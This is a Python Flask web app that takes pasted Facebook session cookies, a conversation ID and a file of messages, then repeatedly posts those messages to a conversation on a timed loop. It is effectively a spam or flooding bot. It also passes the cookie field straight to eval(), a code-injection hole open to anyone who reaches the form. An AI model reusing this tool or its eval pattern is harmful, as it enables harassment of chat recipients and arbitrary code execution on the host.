from flask import Flask, request, render_template_string, redirect, url_for
import requests
import time
import os
from threading import Thread

app = Flask(__name__)

# Global variable to track the message sending status
sending_in_progress = False

# Function to send messages
def send_messages_to_facebook(conversation_id, cookies, message_file, delay):
    global sending_in_progress
    sending_in_progress = True

    # Read the messages from the uploaded TXT file
    messages = message_file.read().decode().splitlines()

    # Prepare the URL for the Graph API endpoint
    url = f"https://graph.facebook.com/v15.0/{conversation_id}/messages"
    
    # Prepare the headers with the cookies
    headers = {
        'Content-Type': 'application/json'
    }

    # Set up the cookies for the session
    session = requests.Session()
    for cookie in cookies:
        session.cookies.set(cookie['name'], cookie['value'])

    success_count = 0
    try:
        for i, message in enumerate(messages):
            if not sending_in_progress:
                print("Message sending stopped.")
                break

            data = {
                "messaging_type": "RESPONSE",
                "message": {"text": message}
            }

            response = session.post(url, json=data, headers=headers)

            if response.status_code == 200:
                print(f"[{i+1}/{len(messages)}] Message sent: {message}")
                success_count += 1
            else:
                print(f"[{i+1}/{len(messages)}] Failed to send message: {message}, Status: {response.status_code}, Error: {response.text}")

            time.sleep(delay)

    except Exception as e:
        print(f"Error occurred: {e}")
    
    print(f"Finished sending messages. {success_count}/{len(messages)} were successful.")
    sending_in_progress = False

@app.route('/', methods=['GET'])
def index():
    # HTML for the form
    return render_template_string("""
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Facebook Message Sender</title>
            <style>
                body { font-family: Arial, sans-serif; background-color: #f4f4f4; padding: 20px; }
                .container { max-width: 600px; margin: auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); }
                input, button { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #ccc; }
                button { background-color: #4CAF50; color: white; cursor: pointer; }
                button:hover { background-color: #45a049; }
                .stop-btn { background-color: #f44336; }
                .stop-btn:hover { background-color: #e53935; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>Send Messages to Facebook Conversation</h2>
                <form action="/" method="post" enctype="multipart/form-data">
                    <label for="conversationId">Conversation ID:</label>
                    <input type="text" id="conversationId" name="conversationId" required>
                    
                    <label for="cookies">Enter Cookies (JSON format):</label>
                    <textarea id="cookies" name="cookies" rows="5" required placeholder='[{"name": "cookie_name", "value": "cookie_value"}]'></textarea>

                    <label for="messageFile">Messages File (TXT):</label>
                    <input type="file" id="messageFile" name="messageFile" accept=".txt" required>

                    <label for="delay">Delay (Seconds):</label>
                    <input type="number" id="delay" name="delay" value="5" min="1" required>
                    
                    <button type="submit" id="submitBtn">Submit</button>
                    <button type="button" class="stop-btn" onclick="stopSending()">Stop</button>
                </form>
                
                {% if sending_in_progress %}
                    <p>Sending messages... Please wait.</p>
                {% endif %}
            </div>

            <script>
                function stopSending() {
                    window.location.href = '/stop';
                }
            </script>
        </body>
        </html>
    """)

@app.route('/', methods=['POST'])
def send_messages():
    global sending_in_progress

    # Check if sending is already in progress
    if sending_in_progress:
        return redirect(url_for('index'))

    conversation_id = request.form.get('conversationId')
    cookies = eval(request.form.get('cookies'))  # Parse the cookies input
    message_file = request.files['messageFile']
    delay = int(request.form.get('delay'))

    # Start sending messages in a separate thread
    thread = Thread(target=send_messages_to_facebook, args=(conversation_id, cookies, message_file, delay))
    thread.start()

    return redirect(url_for('index'))

@app.route('/stop', methods=['GET'])
def stop_sending():
    global sending_in_progress
    sending_in_progress = False
    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
        
